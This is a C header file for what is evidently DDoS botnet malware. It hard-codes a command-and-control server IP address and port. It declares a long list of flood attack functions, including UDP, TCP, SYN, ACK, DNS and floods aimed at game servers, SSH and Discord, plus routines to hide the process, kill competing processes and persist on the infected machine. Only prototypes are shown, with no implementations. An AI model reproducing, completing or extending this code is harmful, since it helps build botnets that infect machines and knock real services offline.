#ifndef BOT_H
#define BOT_H

#ifndef SERVER_IP
#define SERVER_IP "77.239.124.255"
#endif

#include <stdint.h>
#include <pthread.h>
#include <sys/time.h>

#define CNC_PORT "9111"

extern volatile int running;

// PRNG
typedef struct { uint64_t state; } XorShift64;
XorShift64 *rng_new(void);
uint64_t rng_next(XorShift64 *r);
void rng_fill(XorShift64 *r, uint8_t *buf, int len);

// Attack methods
void flood_udp(const char *target, int port, int sec);
void flood_udpbypass(const char *target, int port, int sec);
void flood_pps(const char *target, int port, int sec);
void flood_tcp(const char *target, int port, int sec);
void flood_tcpbypass(const char *target, int port, int sec);
void flood_tcpstomp(const char *target, int port, int sec);
void flood_syn(const char *target, int port, int sec);
void flood_ack(const char *target, int port, int sec);
void flood_dns(const char *target, int port, int sec);
void flood_fortnite(const char *target, int port, int sec);
void flood_minecraft(const char *target, int port, int sec);
void flood_ssh(const char *target, int port, int sec);
void flood_discord(const char *target, int port, int sec);

// Hide / Killer / Persist
void hide(int argc, char **argv);
int start_killer(void);
void persist(void);

#endif
